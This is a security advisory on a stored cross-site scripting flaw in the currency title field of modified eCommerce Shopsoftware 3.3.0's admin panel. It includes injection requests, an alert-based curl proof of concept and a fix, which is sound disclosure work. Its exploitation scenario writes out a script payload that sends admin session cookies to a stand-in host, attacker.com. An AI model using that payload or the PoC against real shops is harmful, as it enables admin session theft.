# Security Advisory: Stored Cross-Site Scripting in admin/currencies.php — Currency Title Field

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 4.8 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') — Stored
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a Stored Cross-Site Scripting vulnerability in `admin/currencies.php`. The currency title field is saved to the database via `xtc_db_prepare_input()` (which only trims and strips slashes, applying no HTML encoding), and later echoed directly into the admin page HTML without `htmlspecialchars()`. Any admin who creates or edits a currency entry with a crafted title can inject persistent JavaScript that executes in the browsers of all admins who subsequently view the currencies list.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/currencies.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

Currency records are saved with `xtc_db_prepare_input($_POST['title'])`, which calls `trim()` and `stripslashes()` only. When the currencies list is rendered, the title is echoed with no output encoding:

```php
// admin/currencies.php:191 (approximate)
echo $currency['title'];
// $currency['title'] came from DB, originally from POST['title']
// xtc_db_prepare_input = trim() + stripslashes() — no htmlspecialchars()
```

An attacker inserts `<script>alert(1)</script>` as the title. The DB stores the raw tag. Every admin page load that lists currencies executes the script.

### Necessary Conditions

- **Authentication:** Admin (to create/edit a currency entry)
- **User interaction:** Required — another admin must view the currencies page
- **Attack vector:** Network

---

## 4. Impact

- **Confidentiality:** Low — session cookies (non-HttpOnly), admin CSRF tokens, page content
- **Integrity:** Low — arbitrary admin actions via scripted requests using victim's admin session
- **Availability:** None

Persistence makes this more impactful than reflected XSS: the payload fires for every admin who views the currencies list, not just the one who clicked a link.

---

## 5. Classification

### CVSS

- **Score:** 4.8
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation (Stored XSS)

### CAPEC

- CAPEC-86: XSS via HTTP Query Strings
- CAPEC-198: XSS Stored

---

## 6. Exploitation Scenario

1. Admin A logs in and creates a new currency with title: `<script>document.location='http://attacker.com/?c='+document.cookie</script>`
2. Payload stored in `currencies.title` column without encoding.
3. Admin B visits the currencies management page.
4. Browser renders the stored script; Admin B's session cookie is exfiltrated to attacker's server.
5. Attacker uses Admin B's session to perform administrative actions.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/currencies.php (line 191)
         Database table: currencies (title column)
Parameter(s): title (POST, via insert/update form)
Method: POST (insert) · Authentication: Admin
```

### Example Request (inject payload)

```http
POST /admin/currencies.php?action=insert HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
Content-Type: application/x-www-form-urlencoded

<securityToken>=<CSRF_VALUE>&title=<script>alert(document.domain)</script>&code=XSS&symbol_left=&symbol_right=$&decimal_point=.&thousands_point=,&decimal_places=2&value=1
```

### Example Request (trigger — view currencies page)

```http
GET /admin/currencies.php HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
```

### Observed Response

```html
HTTP/1.1 200 OK

<td class="dataTableContent"><script>alert(document.domain)</script></td>
```

### Result

Confirmed in authorized Docker lab. Currency record created with XSS payload in title. On subsequent page load, `alert(document.domain)` executed in admin browser.

**Evidence:** `<script>alert(document.domain)</script>` unencoded in HTTP response body.

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V11 PoC — Stored XSS in admin/currencies.php
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Get CSRF token from currencies page
CSRF=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "http://TARGET/admin/currencies.php" | \
  grep -oP '(?<=name="securityToken" value=")[^"]+')

echo "CSRF Token: $CSRF"

# Step 2: Insert currency with XSS payload in title field
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "http://TARGET/admin/currencies.php?action=insert" \
  --data-urlencode "securityToken=$CSRF" \
  --data-urlencode 'title=<script>alert(document.domain)</script>' \
  --data-urlencode 'code=XSS' \
  --data-urlencode 'symbol_left=' \
  --data-urlencode 'symbol_right=$' \
  --data-urlencode 'decimal_point=.' \
  --data-urlencode 'thousands_point=,' \
  --data-urlencode 'decimal_places=2' \
  --data-urlencode 'value=1' \
  -o /dev/null

# Step 3: Retrieve currencies list — confirm XSS payload in response
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "http://TARGET/admin/currencies.php" | grep -i "script"

# Expected: <script>alert(document.domain)</script> in response body
```

### Expected Result

```text
HTTP/1.1 200 OK
[Response body contains:]
<td class="dataTableContent"><script>alert(document.domain)</script></td>
```

### PoC Limitations

- Alert-based PoC is benign; payload is demonstrative only.
- Does not cause service disruption.
- Created currency record can be deleted after testing.

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to Admin → Currencies → New Currency.
3. Enter `<script>alert(1)</script>` in the Title field.
4. Save the record.
5. Reload the currencies list page — script executes.

---

## 10. Mitigation

- Encode output with `htmlspecialchars($currency['title'], ENT_QUOTES, 'UTF-8')` at the echo point.
- Validate currency title input to only allow printable non-HTML characters.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// admin/currencies.php — Vulnerable:
echo $currency['title'];

// Fixed:
echo htmlspecialchars($currency['title'], ENT_QUOTES, 'UTF-8');
```

---

## 12. Detection and Indicators

- `currencies.title` column containing `<`, `>`, or `script` in DB.
- POST to `admin/currencies.php?action=insert` or `update` with HTML tags in `title`.

### Example Log Search

```text
# Check DB:
SELECT currencies_id, title FROM currencies WHERE title LIKE '%<%';
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed in authorized lab |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021/agent-cve-hunter
